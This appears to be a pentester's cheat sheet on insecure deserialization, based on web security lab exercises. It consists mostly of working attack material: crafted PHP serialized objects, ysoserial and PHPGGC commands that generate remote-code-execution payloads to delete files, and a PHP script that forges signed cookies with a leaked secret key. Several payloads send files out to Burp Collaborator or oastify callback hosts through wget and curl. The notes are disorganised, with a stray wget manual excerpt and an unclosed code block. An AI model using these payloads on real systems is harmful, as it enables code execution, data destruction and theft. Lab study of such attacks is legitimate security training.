# Insecure Deserialization

## Description

Serialization is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:

Write complex data to inter-process memory, a file, or a database
Send complex data, for example, over a network, between different components of an application, or in an API call
Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.

### Modifying serialized data types

O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

### Using application functionality to exploit insecure deserialization

s:11:"avatar_link";s:23:"/home/carlos/morale.txt"

### Arbitrary object injection in PHP

You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

###  Exploiting Java deserialization with Apache Commons

java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

### Exploiting PHP deserialization with a pre-built gadget chain


A developer comment discloses the location of a debug file at /cgi-bin/phpinfo.php.
The error message reveals that the website is using the Symfony 4.3.6 framework.
Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you'll need it to sign your exploit later.
Download the "PHPGGC" tool and execute the following command:

./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's morale.txt file.

You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
Assign the object you generated in PHPGGC to the $object variable.
Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable.
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;

```
22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkdWN1d3Q3cGJ1c2hseG1rZmVjcTc4aGUxeXA5NGU0dCI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%224aa8fdf653236ad6fdbc685d03b82ed29bfc7dcc%22%7D
```
Decode it
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkdWN1d3Q3cGJ1c2hseG1rZmVjcTc4aGUxeXA5NGU0dCI7fQ==","sig_hmac_sha1":"4aa8fdf653236ad6fdbc685d03b82ed29bfc7dcc"}
```
THe secret key you can find it in this directory if it's leaked

/cgi-bin/phpinfo.php

Generate the object to sign

```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' -b

OR
 ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0

Look at the cookie session, sometimes you can modified value inside to get privelege escaltion or you can exploit the back-end language system.
An example could be with PHP vulnerabilities, when it compares string with 0 number https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09


In other cases you need to use gadject chain in order to make some action into the Back-end
Using some repository such as:

https://github.com/ambionics/phpggc for PHP

https://github.com/frohoff/ysoserial for JAVA deserialization

Or even with Ruby

https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

In other scenario, try to use TRACE to see all header used by the request, here you can find some hidden header useful

Take a look into ../.git
Sometimes lanch git diff 00a0s.. 990aòòò to see if there is some credentials leak, you can have a look in the file .git/logs/HEAD or similar


Possible payload to retrive file from JAVA deserialization vulnerabilities 

```
 --post-data=string
       --post-file=file
           Use POST as the method for all HTTP requests and send the specified data
           in the request body.  --post-data sends string as data, whereas
           --post-file sends the contents of file.  Other than that, they work in
           exactly the same way. In particular, they both expect content of the
           form "key1=value1&key2=value2", with percent-encoding for special
           characters; the only difference is that one expects its content as a
           command-line parameter and the other accepts its content from a file. In
           particular, --post-file is not for transmitting files as form
           attachments: those must appear as "key=value" data (with appropriate
           percent-coding) just like everything else. Wget does not currently
           support "multipart/form-data" for transmitting POST data; only
           "application/x-www-form-urlencoded". Only one of --post-data and
           --post-file should be specified.
  ```
   
java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections5 'wget --post-file /home/carlos/secret 57atjr760eg9rmvtk7hwu2ho4fa68ux.burpcollaborator.net' | gzip -f | base64 -w0

Sometimes things does't work, therefore you need either increment the CommonCollection{int} or change gadget, and URL-encode everything 

Here are various payload to use and also command

like 'cat /home/carlos/secret' when you want to retrive the file output and it's reflected into the response of the HTTP request.


## Command Exapmle

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -
-wrap=0
```
if you use a wrong collection typical error could be:

"java.lang.ClassNotFoundException: org.apache.commons.collections.keyvalue.TiedMapEntry"

most of the time you need to url encode

typical error:

"java.io.StreamCorruptedException: invalid handle value: 00400053"

To see if you can run command use host or nslookup as follow

```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'curl --data @/home/carlos/morale.txt 6ipaacwvyo2f4zawmuul58ghz85zto.oastify.com' | base64 --wrap=0
```
```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'curl --data @/home/carlos/morale.txt 6ipaacwvyo2f4zawmuul58ghz85zto.oastify.com' | base64 --wrap=0
 ```
 ```
  java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'nslookup 6ipaacwvyo2f4zawmuul58ghz85zto.oastify.com' | base64 --wrap=0
 ```

## PHP sample deserialization
First of all try to decode the cookie and see what you can find
Look at the source coude, usually you can find something to exploit, if you don't understand what the code do, google it



```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjeGoyYmJjMTR6ZzV1bmZyNXdyeHVsbjh2MnFqdDNtbCI7fQ==
```

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"cxj2bbc14zg5unfr5wrxuln8v2qjt3ml";}
```

### Another sample

In this case you found a token signed with hmac_sha1


```
